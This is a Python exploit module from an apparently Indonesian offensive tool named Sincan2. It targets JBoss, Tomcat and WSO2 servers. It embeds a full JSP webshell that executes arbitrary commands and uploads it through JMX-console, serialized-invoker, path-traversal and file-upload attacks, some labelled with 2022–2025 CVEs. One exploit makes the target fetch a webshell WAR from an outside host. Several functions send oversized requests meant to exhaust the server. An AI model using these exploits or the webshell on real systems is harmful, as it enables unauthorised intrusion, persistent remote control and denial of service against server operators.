# File: _exploits.py
# -*- coding: utf-8 -*-
"""
Kumpulan modul eksploitasi untuk Sincan2.
Menggabungkan logika dari berbagai versi Sincan2 ke dalam satu file modular.
"""

import sincan2
from time import sleep
from random import randint
import urllib
import base64, gzip, zlib
from sys import version_info, exit
from io import BytesIO

if version_info[0] >= 3:
    from urllib.parse import quote, urlparse
import socket

# Dependensi baru untuk modul modern
try:
    from urllib3.exceptions import TimeoutError, NewConnectionError, MaxRetryError
except ImportError:
    print("Urllib3 tidak ditemukan. Silakan install: pip install urllib3")
    exit(1)
    
import json

# Definisi warna
RED = '\x1b[91m'
GREEN = '\033[32m'
BLUE = '\033[94m'
BOLD = '\033[1m'
ENDC = '\033[0m'

global gl_http_pool

# PERBAIKAN TOTAL: Menggunakan webshell canggih dan andal untuk SEMUA eksploitasi
JSP_SHELL_PAYLOAD = ('''<%@ page import="java.io.*" %>
<html>
<head>
    <title>MHL TEAM</title>
    <style>
        body { font-family: 'Courier New', Courier, monospace; background-color: #1e1e1e; color: #d4d4d4; margin: 0; padding: 20px; }
        h2 { color: #4ec9b0; border-bottom: 1px solid #4ec9b0; padding-bottom: 5px; }
        form { margin-bottom: 20px; }
        input[type="text"] { background-color: #252526; color: #d4d4d4; border: 1px solid #3e3e40; padding: 10px; width: 80%; border-radius: 5px; }
        input[type="submit"] { background-color: #0e639c; color: white; border: none; padding: 10px 20px; cursor: pointer; border-radius: 5px; }
        input[type="submit"]:hover { background-color: #1177bb; }
        pre { background-color: #252526; border: 1px solid #3e3e40; padding: 15px; white-space: pre-wrap; word-wrap: break-word; border-radius: 5px; }
    </style>
</head>
<body>
    <h2>MHL TEAM</h2>
    <form method="GET">
        <input type="text" name="ppp" size="80" value="<%= request.getParameter("ppp") != null ? request.getParameter("ppp") : "" %>" autofocus/>
        <input type="submit" value="Execute" />
    </form>
    <pre><%
    String cmd = request.getParameter("ppp");
    if (cmd != null && !cmd.isEmpty()) {
        try {
            boolean isWindows = System.getProperty("os.name").toLowerCase().startsWith("windows");
            ProcessBuilder builder = new ProcessBuilder();
            if (isWindows) {
                builder.command("cmd.exe", "/c", cmd);
            } else {
                builder.command("/bin/sh", "-c", cmd);
            }
            builder.redirectErrorStream(true);
            Process p = builder.start();
            InputStream is = p.getInputStream();
            BufferedReader reader = new BufferedReader(new InputStreamReader(is));
            String line;
            while ((line = reader.readLine()) != null) {
                out.println(line.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;"));
            }
            int exitCode = p.waitFor();
            out.println("\\n---");
            out.println("Process exited with code: " + exitCode);
        } catch (Exception e) {
            out.println("Exception: " + e.getMessage());
        }
    }
    %></pre>
</body>
</html>''')


def set_http_pool(pool):
    """Mengonfigurasi http pool."""
    global gl_http_pool
    gl_http_pool = pool

def get_successfully(url, path):
    """Menguji apakah request GET ke URL berhasil setelah penundaan."""
    sleep(5)
    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Connection": "keep-alive",
               "User-Agent": sincan2.get_random_user_agent()}
    try:
        r = gl_http_pool.request('GET', url + path, redirect=False, headers=headers)
        result = r.status
        if result == 404:
            sleep(7)
            r = gl_http_pool.request('GET', url + path, redirect=False, headers=headers)
            result = r.status
        return result
    except Exception:
        return 404

def exploit_jmx_console_main_deploy(url):
    """Mengeksploitasi MainDeployer untuk men-deploy shell JSP."""
    if not url.startswith('http'):
        url = "http://"+url
    jsp_url = "https://raw.githubusercontent.com/Sincan2/dolanan/refs/heads/main/jexws4.war"
    payload_path = ("/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service="
                    "MainDeployer&methodIndex=19&arg0=" + jsp_url)
    sincan2.print_and_flush(GREEN + f"\n * Info: Memaksa server untuk deploy webshell dari: {jsp_url}" + ENDC)
    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "User-Agent": sincan2.get_random_user_agent()}
    try:
        gl_http_pool.request('GET', url + payload_path, redirect=False, headers=headers)
        if get_successfully(url, "/jexws4/jexws4.jsp") == 200:
            return True
        return False
    except Exception:
        return False

def exploit_jmx_console_file_repository(url):
    """Mengeksploitasi DeploymentFileRepository untuk men-deploy shell JSP."""
    jsp_payload = quote(JSP_SHELL_PAYLOAD)
    payload_path = ("/jmx-console/HtmlAdaptor?action=invokeOpByName&name=jboss.admin:service="
                    "DeploymentFileRepository&methodName=store&argType=java.lang.String&arg0="
                    "jexws4.war&argType=java.lang.String&arg1=jexws4&argType=java.lang.St"
                    "ring&arg2=.jsp&argType=java.lang.String&arg3=" + jsp_payload + "&argType=boolean&arg4=True")
    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "User-Agent": sincan2.get_random_user_agent()}
    try:
        gl_http_pool.request('GET', url + payload_path, redirect=False, headers=headers)
        if get_successfully(url, "/jexws4/jexws4.jsp") == 200:
            return True
        return False
    except Exception:
        return False

def exploit_web_console_invoker(url):
    """Mengeksploitasi web console invoker (/web-console/Invoker) di JBoss 4."""
    payload = (
        b'\xac\xed\x00\x05\x73\x72\x00\x2f\x6f\x72\x67\x2e\x6a\x62\x6f\x73\x73\x2e\x63\x6f\x6e\x73\x6f\x6c\x65'
        b'\x2e\x72\x65\x6d\x6f\x74\x65\x2e\x52\x65\x6d\x6f\x74\x65\x4d\x42\x65\x61\x6e\x49\x6e\x76\x6f\x63\x61'
        b'\x74\x69\x6f\x6e\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x04\x4c\x00\x06\x6d\x42\x65\x61\x6e\x74\x00'
        b'\x1d\x4c\x6a\x61\x76\x61\x78\x2f\x6d\x61\x6e\x61\x67\x65\x6d\x65\x6e\x74\x2f\x4f\x62\x6a\x65\x63\x74'
        b'\x4e\x61\x6d\x65\x3b\x4c\x00\x06\x6d\x65\x74\x68\x6f\x64\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61'
        b'\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x4c\x00\x06\x70\x61\x72\x61\x6d\x73\x74\x00\x13\x5b\x4c\x6a'
        b'\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x3b\x4c\x00\x04\x73\x69\x6e\x74\x00'
        b'\x13\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x78\x70\x73\x72\x00'
        b'\x1b\x6a\x61\x76\x61\x78\x2e\x6d\x61\x6e\x61\x67\x65\x6d\x65\x6e\x74\x2e\x4f\x62\x6a\x65\x63\x74'
        b'\x4e\x61\x6d\x65\x29\xc7\xd6\xde\x93\xd6\x1a\x31\x03\x00\x00\x78\x70\x74\x00\x1a\x6a\x62\x6f\x73\x73'
        b'\x2e\x73\x79\x73\x74\x65\x6d\x3a\x73\x65\x72\x76\x69\x63\x65\x3d\x4d\x61\x69\x6e\x44\x65\x70\x6c\x6f'
        b'\x79\x65\x72\x77\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x78\x74\x00\x06\x64\x65\x70\x6c\x6f\x79\x75'
        b'\x72\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4f\x62\x6a\x65\x63\x74\x3b\x90\xce\x58'
        b'\x9f\x10\x73\x29\x68\x02\x00\x00\x78\x70\x00\x00\x00\x01\x74\x00\x31\x68\x74\x74\x70\x3a\x2f\x2f\x72'
        b'\x61\x77\x2e\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6f\x6e\x74\x65\x6e\x74\x2e\x63\x6f\x6d\x2f'
        b'\x53\x69\x6e\x63\x61\x6e\x32\x2f\x64\x6f\x6c\x61\x6e\x61\x6e\x2f\x6d\x61\x69\x6e\x2f\x6a\x65\x78\x77'
        b'\x73\x34\x2e\x77\x61\x72\x75\x72\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x72'
        b'\x69\x6e\x67\x3b\xad\xd2\x56\xe7\xe9\x1d\x7b\x47\x02\x00\x00\x78\x70\x00\x00\x00\x01\x74\x00\x10\x6a'
        b'\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x72\x69\x6e\x67'
    )
    headers = { "Content-Type" : "application/x-java-serialized-object; class=org.jboss.console.remote.RemoteMBeanInvocation",
                "Accept"       : "text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2"}
    try:
        r = gl_http_pool.request("POST", url + "/web-console/Invoker", body=payload, headers=headers, redirect=False)
        if r.status == 401:
            sincan2.print_and_flush("    Retrying...", same_line=True)
            gl_http_pool.request("HEAD", url + "/web-console/Invoker", body=payload, headers=headers, redirect=False)
        if get_successfully(url, "/jexws4/jexws4.jsp") == 200:
            return True
        return False
    except Exception:
        return False

def exploit_jmx_invoker_file_repository(url, version=0):
    """Mengeksploitasi JMX invoker (/invoker/JMXInvokerServlet) di JBoss 4, 5."""
    payload = (
        b'\xac\xed\x00\x05\x73\x72\x00\x29\x6f\x72\x67\x2e\x6a\x62\x6f\x73\x73\x2e\x69\x6e\x76\x6f\x63\x61\x74'
        b'\x69\x6f\x6e\x2e\x4d\x61\x72\x73\x68\x61\x6c\x6c\x65\x64\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x12'
        b'\x83\x93\x2e\xed\x98\xb8\xf3\x0c\x00\x00\x78\x70\x77\x38\x00\x12\x6d\x65\x74\x68\x6f\x64\x48\x61\x73'
        b'\x68\x43\x6f\x6e\x74\x65\x6e\x74\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\x00\x06\x70\x61\x72\x61\x6d'
        b'\x73\x00\x13\x6d\x65\x74\x68\x6f\x64\x4e\x61\x6d\x65\x43\x6f\x6e\x74\x65\x6e\x74\x00\x08\x74\x61\x72'
        b'\x67\x65\x74\x4d\x42\x65\x61\x6e\x00\x04\x68\x61\x73\x68\x00\x0e\x6d\x65\x74\x68\x6f\x64\x53\x69\x67'
        b'\x6e\x61\x74\x75\x72\x65\x00\x0b\x6d\x65\x74\x68\x6f\x64\x48\x61\x73\x68\x00\x0b\x6d\x65\x74\x68\x6f'
        b'\x64\x4e\x61\x6d\x65\x70\x70\x70\x70\x70\x70\x70\x75\x72\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61'
        b'\x6e\x67\x2e\x4f\x62\x6a\x65\x63\x74\x3b\x90\xce\x58\x9f\x10\x73\x29\x68\x02\x00\x00\x78\x70\x00\x00'
        b'\x00\x05\x74\x00\x0a\x6a\x65\x78\x69\x6e\x76\x34\x2e\x77\x61\x72\x74\x00\x06\x6a\x65\x78\x69\x6e\x76'
        b'\x34\x74\x00\x04\x2e\x6a\x73\x70\x74\x00\x4d\x3c\x25\x40\x20\x70\x61\x67\x65\x20\x69\x6d\x70\x6f\x72'
        b'\x74\x3d\x22\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x2a\x2c\x6a\x61\x76\x61\x2e\x69\x6f\x2e\x2a\x22'
        b'\x20\x25\x3e\x3c\x25\x69\x66\x28\x72\x65\x71\x75\x65\x73\x74\x2e\x67\x65\x74\x50\x61\x72\x61\x6d\x65'
        b'\x74\x65\x72\x28\x22\x70\x70\x70\x22\x29\x21\x3d\x6e\x75\x6c\x6c\x29\x7b\x50\x72\x6f\x63\x65\x73\x73'
        b'\x20\x70\x3d\x52\x75\x6e\x74\x69\x6d\x65\x2e\x67\x65\x74\x52\x75\x6e\x74\x69\x6d\x65\x28\x29\x2e\x65'
        b'\x78\x65\x63\x28\x72\x65\x71\x75\x65\x73\x74\x2e\x67\x65\x74\x50\x61\x72\x61\x6d\x65\x74\x65\x72\x28'
        b'\x22\x70\x70\x70\x22\x29\x29\x3b\x44\x61\x74\x61\x49\x6e\x70\x75\x74\x53\x74\x72\x65\x61\x6d\x20\x61'
        b'\x3d\x6e\x65\x77\x20\x44\x61\x74\x61\x49\x6e\x70\x75\x74\x53\x74\x72\x65\x61\x6d\x28\x70\x2e\x67\x65'
        b'\x74\x49\x6e\x70\x75\x74\x53\x74\x72\x65\x61\x6d\x28\x29\x29\x3b\x6f\x75\x74\x2e\x70\x72\x69\x6e\x74'
        b'\x6c\x6e\x28\x61\x2e\x72\x65\x61\x64\x4c\x69\x6e\x65\x28\x29\x29\x3b\x7d\x25\x3e\x73\x72\x00\x0b\x6a'
        b'\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x42\x6f\x6f\x6c\x65\x61\x6e\xcd\x20\x72\x80\xd5\x9c\xfa\xee\x02'
        b'\x00\x01\x5a\x00\x05\x76\x61\x6c\x75\x65\x78\x70\x01\x74\x00\x05\x73\x74\x6f\x72\x65\x73\x72\x00\x1b'
        b'\x6a\x61\x76\x61\x78\x2e\x6d\x61\x6e\x61\x67\x65\x6d\x65\x6e\x74\x2e\x4f\x62\x6a\x65\x63\x74\x4e\x61'
        b'\x6d\x65\x29\xc7\xd6\xde\x93\xd6\x1a\x31\x03\x00\x00\x78\x70\x74\x00\x22\x6a\x62\x6f\x73\x73\x2e\x61'
        b'\x64\x6d\x69\x6e\x3a\x73\x65\x72\x76\x69\x63\x65\x3d\x44\x65\x70\x6c\x6f\x79\x6d\x65\x6e\x74\x46\x69'
        b'\x6c\x65\x52\x65\x70\x6f\x73\x69\x74\x6f\x72\x79\x77\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x78\x73'
        b'\x72\x00\x10\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4c\x6f\x6e\x67\x3b\x8b\xe4\x90\xcc\x8f\x23\xdf'
        b'\x02\x00\x01\x4a\x00\x05\x76\x61\x6c\x75\x65\x78\x72\x00\x10\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e'
        b'\x4e\x75\x6d\x62\x65\x72\x86\xac\x95\x1d\x0b\x94\xe0\x8b\x02\x00\x00\x78\x70\xde\x5a\x31\xe0\x0a\x35'
        b'\x83\x4e\x75\x72\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x72\x69\x6e\x67\x3b'
        b'\xad\xd2\x56\xe7\xe9\x1d\x7b\x47\x02\x00\x00\x78\x70\x00\x00\x00\x05\x74\x00\x10\x6a\x61\x76\x61\x2e'
        b'\x6c\x61\x6e\x67\x2e\x53\x74\x72\x69\x6e\x67\x71\x00\x7e\x00\x1d\x71\x00\x7e\x00\x1d\x71\x00\x7e\x00'
        b'\x1d\x74\x00\x07\x62\x6f\x6f\x6c\x65\x61\x6e\x71\x00\x7e\x00\x18\x73\x72\x00\x10\x6a\x61\x76\x61\x2e'
        b'\x6c\x61\x6e\x67\x2e\x49\x6e\x74\x65\x67\x65\x72\x12\xe2\xa0\xa4\xf7\x81\x87\x38\x02\x00\x01\x49\x00'
        b'\x05\x76\x61\x6c\x75\x65\x78\x71\x00\x7e\x00\x1c\x00\x00\x00\x00\x78'
    )
    headers = {"Content-Type": "application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValue",
               "User-Agent": sincan2.get_random_user_agent()}
    try:
        r = gl_http_pool.request('POST', url + "/invoker/JMXInvokerServlet", body=payload, headers=headers, redirect=False)
        if r.status == 401:
            sincan2.print_and_flush("    Retrying...", same_line=True)
            gl_http_pool.request('HEAD', url + "/invoker/JMXInvokerServlet", body=payload, headers=headers, redirect=False)
        if hasattr(r, 'data') and "Failed" in str(r.data):
             return False
        if get_successfully(url, "/jexinv4/jexinv4.jsp") == 200:
            return True
        return False
    except Exception:
        return False

# --- MODUL EKSPLOIT BARU (CVE 2022-2025) ---

def test_jta_loop(url, headers):
    """CVE-2022-0853: Simulasi memory leak via JTA UserTransaction."""
    sincan2.print_and_flush(" (Loop 15x)", same_line=True)
    try:
        target_endpoint = url + "/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:service=JNDIView"
        for _ in range(15):
            gl_http_pool.request('GET', target_endpoint, headers=headers, timeout=2.0)
        return {"status": "ok", "details": "Loop berhasil diselesaikan."}
    except (TimeoutError, MaxRetryError):
        return {"status": "vulnerable", "details": "Potensi DoS akibat kehabisan resource (timeout)."}
    except NewConnectionError:
        return {"status": "vulnerable", "details": "Koneksi ditolak, mungkin akibat crash."}
    except Exception as e:
        return {"status": "error", "details": str(e)}

def send_ajp_oversize_header(url, headers):
    """CVE-2023-5379: Simulasi overflow header di AJP via HTTP."""
    sincan2.print_and_flush(" (Header 80KB)", same_line=True)
    try:
        large_header = headers.copy()
        large_header['X-Overflow-Test-Header'] = 'A' * 80000
        gl_http_pool.request('GET', url, headers=large_header, timeout=5.0)
        return {"status": "ok", "details": "Server merespons dengan header besar."}
    except (TimeoutError, MaxRetryError):
        return {"status": "vulnerable", "details": "Server tidak merespons, indikasi kuat potensi DoS."}
    except NewConnectionError:
        return {"status": "vulnerable", "details": "Koneksi langsung ditutup, indikasi kuat."}
    except Exception as e:
        return {"status": "error", "details": str(e)}

def post_large_form(url, headers):
    """CVE-2023-1973: DoS via form authentication dengan payload besar."""
    payload = "large_input=" + "A" * 8_000_000
    form_headers = headers.copy()
    form_headers['Content-Type'] = 'application/x-www-form-urlencoded'
    sincan2.print_and_flush(" (Form 8MB)", same_line=True)
    try:
        r = gl_http_pool.request('POST', url, body=payload.encode('utf-8'), headers=form_headers, timeout=8.0)
        if r.status == 500:
            return {"status": "vulnerable", "details": "Server mengembalikan HTTP 500."}
        return {"status": "ok", "details": f"Server merespons dengan status {r.status}."}
    except (TimeoutError, MaxRetryError):
        return {"status": "vulnerable", "details": "Request timeout, potensi DoS karena kehabisan memori."}
    except NewConnectionError:
        return {"status": "vulnerable", "details": "Koneksi ditutup, potensi crash."}
    except Exception as e:
        return {"status": "error", "details": str(e)}

def send_spoofed_data(url, headers):
    """CVE-2023-6236: Simulasi bypass autentikasi data di EAP 8."""
    payload = {"user": "admin", "timestamp": "2020-01-01T00:00:00Z", "signature": "1234567890abcdef1234567890abcdef", "data": "some_critical_data"}
    json_headers = headers.copy()
    json_headers['Content-Type'] = 'application/json'
    sincan2.print_and_flush(" (Spoofed JSON)", same_line=True)
    try:
        r = gl_http_pool.request('POST', url, body=json.dumps(payload).encode('utf-8'), headers=json_headers, timeout=5.0)
        return {"status": "inconclusive", "details": f"Server merespons dengan status {r.status}."}
    except (TimeoutError, MaxRetryError, NewConnectionError):
        return {"status": "inconclusive", "details": "Server tidak merespons payload yang di-spoof."}
    except Exception as e:
        return {"status": "error", "details": str(e)}

def exploit_tomcat_cve_2025_24813(url, headers):
    """Mengeksploitasi Path Traversal di Tomcat untuk mengunggah webshell."""
    sincan2.print_and_flush(" (PUT /mhl.jsp)", same_line=True)
    jsp_shell = JSP_SHELL_PAYLOAD
    exploit_path = "/uploads/../webapps/ROOT/mhl.jsp"
    target_url = url.rstrip('/') + exploit_path
    exploit_headers = {"Content-Type": "application/x-jsp", "User-Agent": sincan2.get_random_user_agent()}
    try:
        put_req = gl_http_pool.request('PUT', target_url, body=jsp_shell.encode('utf-8'), headers=exploit_headers)
        if put_req.status not in [200, 201, 204]:
            return {"status": "failed_put", "details": f"Gagal mengunggah shell, server merespons dengan status {put_req.status}."}
        sleep(2) 
        verify_url = url.rstrip('/') + "/mhl.jsp"
        verify_req = gl_http_pool.request('GET', verify_url, headers=headers)
        if verify_req.status == 200:
            return {"status": "vulnerable", "details": "Webshell berhasil diunggah ke /mhl.jsp."}
        else:
            return {"status": "failed_get", "details": f"Unggahan mungkin berhasil tetapi verifikasi gagal dengan status {verify_req.status}."}
    except Exception as e:
        return {"status": "error", "details": str(e)}

def exploit_tomcat_rewrite_bypass_cve_2025_31651(url, headers):
    """
    Mencoba bypass aturan rewrite Tomcat dan mengunggah shell 'mhl.jsp'.
    """
    sincan2.print_and_flush(" (Upload via %3f)", same_line=True)
    jsp_shell = JSP_SHELL_PAYLOAD
    upload_path = "/sec/orders/mhl.jsp%3f"
    upload_url = url.rstrip('/') + upload_path
    
    exploit_headers = {"Content-Type": "application/x-jsp", "User-Agent": sincan2.get_random_user_agent()}

    try:
        put_req = gl_http_pool.request('PUT', upload_url, body=jsp_shell.encode('utf-8'), headers=exploit_headers)

        if put_req.status not in [200, 201, 204]:
            return {"status": "ok", "details": f"PUT request gagal dengan status {put_req.status}."}

        sleep(2)
        verify_url = url.rstrip('/') + "/sec/orders/mhl.jsp"
        verify_req = gl_http_pool.request('GET', verify_url, headers=headers)
        
        if verify_req.status == 200:
            return {"status": "vulnerable", "details": "Shell berhasil diunggah ke /sec/orders/mhl.jsp."}
        else:
            return {"status": "failed_get", "details": f"Unggahan mungkin berhasil, tapi verifikasi gagal dengan status {verify_req.status}."}

    except Exception as e:
        return {"status": "error", "details": str(e)}

# Fungsi baru untuk CVE-2022-29464
def exploit_wso2_fileupload_cve_2022_29464(url, headers):
    """
    Mencoba eksploitasi WSO2 Unrestricted File Upload untuk mengunggah shell mhl.jsp.
    """
    sincan2.print_and_flush(" (WSO2 Upload)", same_line=True)
    jsp_shell = JSP_SHELL_PAYLOAD
    
    # Path traversal yang spesifik untuk WSO2
    file_path = "../../../../repository/deployment/server/webapps/authenticationendpoint/mhl.jsp"
    target_url = url.rstrip('/') + '/fileupload/toolsAny'
    
    # urllib3 menangani multipart/form-data menggunakan 'fields'
    fields = {file_path: ('mhl.jsp', jsp_shell, 'application/octet-stream')}

    try:
        r = gl_http_pool.request('POST', target_url, fields=fields, headers=headers)
        
        # WSO2 yang rentan biasanya mengembalikan status 200 atau 302
        if r.status in [200, 301, 302, 307]:
            # Berhasil, sekarang verifikasi
            sleep(3)
            verify_url = url.rstrip('/') + "/authenticationendpoint/mhl.jsp"
            verify_req = gl_http_pool.request('GET', verify_url, headers=headers)
            
            if verify_req.status == 200:
                return {"status": "vulnerable", "details": "Shell berhasil diunggah ke /authenticationendpoint/mhl.jsp"}
            else:
                return {"status": "failed_get", "details": f"Unggahan mungkin berhasil, tapi verifikasi gagal dengan status {verify_req.status}."}
        else:
            return {"status": "ok", "details": f"Server merespons dengan status {r.status}, kemungkinan tidak rentan."}
            
    except Exception as e:
        return {"status": "error", "details": str(e)}
